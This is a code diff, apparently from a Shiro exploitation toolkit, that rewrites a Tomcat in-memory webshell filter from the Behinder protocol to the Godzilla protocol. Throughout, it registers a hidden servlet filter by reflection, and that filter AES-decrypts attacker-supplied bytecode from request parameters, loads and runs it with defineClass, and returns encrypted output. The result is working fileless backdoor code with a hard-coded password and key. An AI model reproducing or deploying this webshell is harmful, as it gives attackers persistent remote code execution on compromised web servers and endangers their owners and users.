@@ -1,14 +1,11 @@
+
 package com.y5neko.shiroexp.memshell;
 
+import org.apache.catalina.LifecycleState;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.StandardContext;
+import org.apache.catalina.util.LifecycleBase;
 
-import java.io.IOException;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
-import java.math.BigInteger;
-import java.security.MessageDigest;
-import java.util.EnumSet;
-import java.util.HashMap;
-import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.*;
@@ -16,29 +13,46 @@ import javax.servlet.FilterRegistration.Dynamic;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
-import org.apache.catalina.LifecycleState;
-import org.apache.catalina.connector.RequestFacade;
-import org.apache.catalina.connector.ResponseFacade;
-import org.apache.catalina.core.ApplicationContext;
-import org.apache.catalina.core.StandardContext;
-import org.apache.catalina.util.LifecycleBase;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.util.EnumSet;
 
-public final class BehinderFilter extends ClassLoader implements Filter {
+public class GodzillaFilter extends ClassLoader implements Filter {
     public HttpServletRequest request = null;
     public HttpServletResponse response = null;
-    public String cs = "UTF-8";
-    public String Pwd = "f98169dbc69102e0";
+    String xc = "3c6e0b8a9c15224a";
+    public String Pwd = "Y5neKO@2024";
     public String path = "/img/20190231.png";
+    String md5;
+    public String cs;
 
-    public BehinderFilter() {
+    public GodzillaFilter() {
+        this.md5 = md5(this.Pwd + this.xc);
+        this.cs = "UTF-8";
     }
 
-    public BehinderFilter(ClassLoader c) {
-        super(c);
+    public GodzillaFilter(ClassLoader z) {
+        super(z);
+        this.md5 = md5(this.Pwd + this.xc);
+        this.cs = "UTF-8";
     }
 
-    public Class g(byte[] b) {
-        return super.defineClass(b, 0, b.length);
+    public Class Q(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
+    }
+
+    public byte[] x(byte[] s, boolean m) {
+        try {
+            Cipher c = Cipher.getInstance("AES");
+            c.init(m ? 1 : 2, new SecretKeySpec(this.xc.getBytes(), "AES"));
+            return c.doFinal(s);
+        } catch (Exception var4) {
+            return null;
+        }
     }
 
     public static String md5(String s) {
@@ -47,16 +61,57 @@ public final class BehinderFilter extends ClassLoader implements Filter {
         try {
             MessageDigest m = MessageDigest.getInstance("MD5");
             m.update(s.getBytes(), 0, s.length());
-            ret = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
+            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
         } catch (Exception var3) {
         }
 
         return ret;
     }
 
+    public static String base64Encode(byte[] bs) throws Exception {
+        String value = null;
+
+        Class base64;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object Encoder = base64.getMethod("getEncoder", (Class[])null).invoke(base64, (Object[])null);
+            value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
+        } catch (Exception var6) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Encoder");
+                Object Encoder = base64.newInstance();
+                value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
+            } catch (Exception var5) {
+            }
+        }
+
+        return value;
+    }
+
+    public static byte[] base64Decode(String bs) throws Exception {
+        byte[] value = null;
+
+        Class base64;
+        try {
+            base64 = Class.forName("java.util.Base64");
+            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
+            value = (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
+        } catch (Exception var6) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object decoder = base64.newInstance();
+                value = (byte[])((byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
+            } catch (Exception var5) {
+            }
+        }
+
+        return value;
+    }
+
     public boolean equals(Object obj) {
         this.parseObj(obj);
-        this.Pwd = md5(this.request.getHeader("p"));
+        this.Pwd = this.request.getHeader("p");
+        this.md5 = md5(this.Pwd + this.xc);
         this.path = this.request.getHeader("path");
         StringBuffer output = new StringBuffer();
         String tag_s = "->|";
@@ -68,7 +123,7 @@ public final class BehinderFilter extends ClassLoader implements Filter {
             this.response.setCharacterEncoding(this.cs);
             output.append(this.addFilter());
         } catch (Exception var7) {
-            output.append("ERROR:// " + var7.toString());
+            output.append("error:" + var7.toString());
         }
 
         try {
@@ -179,67 +234,33 @@ public final class BehinderFilter extends ClassLoader implements Filter {
         }
     }
 
-    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
-        HttpSession session = ((HttpServletRequest)req).getSession();
-        Object lastRequest = req;
-        Object lastResponse = resp;
-        // 解决包装类RequestWrapper的问题
-        // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
-        if (!(lastRequest instanceof RequestFacade)) {
-            Method getRequest = null;
-            try {
-                getRequest = ServletRequestWrapper.class.getMethod("getRequest");
-                lastRequest = getRequest.invoke(request);
-                while (true) {
-                    if (lastRequest instanceof RequestFacade) break;
-                    lastRequest = getRequest.invoke(lastRequest);
-                }
-            } catch (Exception e) {
-//                e.printStackTrace();
-            }
-        }
-        // 解决包装类ResponseWrapper的问题
-        try {
-            if (!(lastResponse instanceof ResponseFacade)) {
-                Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
-                lastResponse = getResponse.invoke(response);
-                while (true) {
-                    if (lastResponse instanceof ResponseFacade) break;
-                    lastResponse = getResponse.invoke(lastResponse);
-                }
-            }
-        }catch (Exception e) {
-
-        }
-
-        Map obj = new HashMap();
-        obj.put("request", lastRequest);
-        obj.put("response", lastResponse);
-        obj.put("session", session);
-
-        try {
-            session.putValue("u", this.Pwd);
-            Cipher c = Cipher.getInstance("AES");
-            c.init(2, new SecretKeySpec(this.Pwd.getBytes(), "AES"));
-            (new BehinderFilter(this.getClass().getClassLoader())).g(c.doFinal(this.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);
-        } catch (Exception var7) {
-            var7.printStackTrace();
-        }
-
-    }
-
-    public byte[] base64Decode(String str) throws Exception {
-        try {
-            Class clazz = Class.forName("sun.misc.BASE64Decoder");
-            return (byte[])((byte[])clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str));
-        } catch (Exception var5) {
-            Class clazz = Class.forName("java.util.Base64");
-            Object decoder = clazz.getMethod("getDecoder").invoke((Object)null);
-            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, str));
-        }
-    }
-
     public void init(FilterConfig filterConfig) throws ServletException {
+    }
+
+    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
+
+        try {
+            HttpServletRequest request = (HttpServletRequest)req;
+            HttpServletResponse response = (HttpServletResponse)resp;
+            HttpSession session = request.getSession();
+            byte[] data = base64Decode(req.getParameter(this.Pwd));
+            data = this.x(data, false);
+            if (session.getAttribute("payload") == null) {
+                session.setAttribute("payload", (new GodzillaFilter(this.getClass().getClassLoader())).Q(data));
+            } else {
+                request.setAttribute("parameters", data);
+                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                Object f = ((Class)session.getAttribute("payload")).newInstance();
+                f.equals(arrOut);
+                f.equals(request);
+                response.getWriter().write(this.md5.substring(0, 16));
+                f.toString();
+                response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
+                response.getWriter().write(this.md5.substring(16));
+            }
+        } catch (Exception var10) {
+        }
+
     }
 
     public void destroy() {
